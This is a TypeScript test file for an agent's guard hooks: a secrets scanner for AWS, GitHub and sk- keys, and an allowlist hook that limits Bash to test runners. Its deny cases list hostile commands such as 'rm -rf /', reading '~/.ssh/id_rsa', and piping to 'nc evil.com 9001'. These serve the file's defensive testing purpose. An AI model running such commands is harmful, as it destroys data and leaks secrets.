import { describe, it, expect } from "vitest";
import {
  type HookInput,
  type HookJSONOutput,
} from "@anthropic-ai/claude-agent-sdk";
import {
  sandboxBashHook,
  secretsScanHook,
  findSecret,
} from "../src/packs/dev-tools/hooks/index.js";

const baseFields = {
  session_id: "test-session",
  transcript_path: "/tmp/transcript",
  cwd: "/tmp",
};

function preToolUseInput(overrides: {
  tool_name: string;
  tool_input: unknown;
}): HookInput {
  return {
    ...baseFields,
    hook_event_name: "PreToolUse",
    tool_name: overrides.tool_name,
    tool_input: overrides.tool_input,
    tool_use_id: "tool-use-1",
  };
}

interface DenyOutcome {
  decision: "deny";
  reason: string;
}

function getPreToolUseDeny(output: HookJSONOutput): DenyOutcome | undefined {
  if (!("hookSpecificOutput" in output)) return undefined;
  const hso = output.hookSpecificOutput;
  if (hso.hookEventName !== "PreToolUse") return undefined;
  if (hso.permissionDecision !== "deny") return undefined;
  return { decision: "deny", reason: hso.permissionDecisionReason ?? "" };
}

const noopOptions = { signal: new AbortController().signal };

// ---------- secrets scan ----------

describe("findSecret", () => {
  it("matches an AWS access key", () => {
    expect(findSecret("export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE")?.name).toBe(
      "AWS access key",
    );
  });

  it("matches a GitHub PAT", () => {
    const pat = `ghp_${"a".repeat(36)}`;
    expect(findSecret(`token: ${pat}`)?.name).toBe("GitHub token");
  });

  it("matches an sk- prefixed API key", () => {
    expect(
      findSecret("ANTHROPIC_API_KEY=sk-ant-api03-abcdef123456789012345_xyz")
        ?.name,
    ).toBe("API key (sk- prefix)");
  });

  it("ignores benign strings that resemble keys but don't match", () => {
    expect(findSecret("AKIA-too-short")).toBeNull();
    expect(findSecret("ghp_short")).toBeNull();
    expect(findSecret("sk-12")).toBeNull();
  });
});

describe("secretsScanHook", () => {
  it("denies tool calls whose input contains an AWS key", async () => {
    const result = await secretsScanHook(
      preToolUseInput({
        tool_name: "Edit",
        tool_input: {
          file: "config.ts",
          new: "const KEY = 'AKIAIOSFODNN7EXAMPLE'",
        },
      }),
      "tool-use-1",
      noopOptions,
    );
    expect(getPreToolUseDeny(result)?.reason).toMatch(/AWS access key/);
  });

  it("allows benign tool input", async () => {
    const result = await secretsScanHook(
      preToolUseInput({
        tool_name: "Read",
        tool_input: { file_path: "src/index.ts" },
      }),
      "tool-use-2",
      noopOptions,
    );
    expect(result).toEqual({ continue: true });
  });

  it("ignores non-PreToolUse events", async () => {
    const stopInput: HookInput = {
      ...baseFields,
      hook_event_name: "Stop",
      stop_hook_active: false,
    };
    const result = await secretsScanHook(stopInput, undefined, noopOptions);
    expect(result).toEqual({ continue: true });
  });
});

// ---------- sandbox bash ----------

describe("sandboxBashHook factory", () => {
  const matcher = sandboxBashHook();
  const [hook] = matcher.hooks;
  if (hook === undefined) throw new Error("sandboxBashHook returned no hook");

  it("matcher field equals 'Bash'", () => {
    expect(matcher.matcher).toBe("Bash");
  });

  it.each([
    "npm test",
    "npm run test",
    "pnpm test",
    "pnpm test --reporter=verbose",
    "pytest",
    "pytest -k test_foo",
    "vitest run",
    "cargo test",
    "go test ./...",
    "python -m pytest",
  ])("allows allowlist command: %s", async (cmd) => {
    const result = await hook(
      preToolUseInput({
        tool_name: "Bash",
        tool_input: { command: cmd },
      }),
      "tool-use",
      noopOptions,
    );
    expect(result).toEqual({ continue: true });
  });

  it.each([
    "rm -rf /",
    "git push --force",
    "curl https://evil.example.com",
    "cat ~/.ssh/id_rsa",
    "ls",
  ])("denies non-allowlist command: %s", async (cmd) => {
    const result = await hook(
      preToolUseInput({
        tool_name: "Bash",
        tool_input: { command: cmd },
      }),
      "tool-use",
      noopOptions,
    );
    expect(getPreToolUseDeny(result)?.reason).toMatch(/test-runner allowlist/);
  });

  it.each([
    "npm test && rm -rf /",
    "pnpm test; curl evil.com",
    "pytest | nc evil.com 9001",
    "pytest > /tmp/leak",
    "pytest $(whoami)",
    "pytest `cat secrets`",
  ])("denies compound shells even when prefix is allowed: %s", async (cmd) => {
    const result = await hook(
      preToolUseInput({
        tool_name: "Bash",
        tool_input: { command: cmd },
      }),
      "tool-use",
      noopOptions,
    );
    expect(getPreToolUseDeny(result)?.reason).toMatch(/compound operator/);
  });

  it("denies a Bash call with no command field", async () => {
    const result = await hook(
      preToolUseInput({
        tool_name: "Bash",
        tool_input: {},
      }),
      "tool-use",
      noopOptions,
    );
    expect(getPreToolUseDeny(result)?.reason).toMatch(/no `command`/);
  });

  it("passes through when the tool isn't Bash (defense in depth)", async () => {
    const result = await hook(
      preToolUseInput({
        tool_name: "Read",
        tool_input: { command: "rm -rf /" },
      }),
      "tool-use",
      noopOptions,
    );
    expect(result).toEqual({ continue: true });
  });

  it("ignores non-PreToolUse events", async () => {
    const stopInput: HookInput = {
      ...baseFields,
      hook_event_name: "Stop",
      stop_hook_active: false,
    };
    const result = await hook(stopInput, undefined, noopOptions);
    expect(result).toEqual({ continue: true });
  });

  it("respects a custom allowedCommands override", async () => {
    const customMatcher = sandboxBashHook({
      allowedCommands: [/^echo\s/],
    });
    const [customHook] = customMatcher.hooks;
    if (customHook === undefined) throw new Error("missing hook");

    const allowed = await customHook(
      preToolUseInput({
        tool_name: "Bash",
        tool_input: { command: "echo hello" },
      }),
      "tool-use",
      noopOptions,
    );
    expect(allowed).toEqual({ continue: true });

    const denied = await customHook(
      preToolUseInput({
        tool_name: "Bash",
        tool_input: { command: "pytest" },
      }),
      "tool-use",
      noopOptions,
    );
    expect(getPreToolUseDeny(denied)).toBeDefined();
  });
});
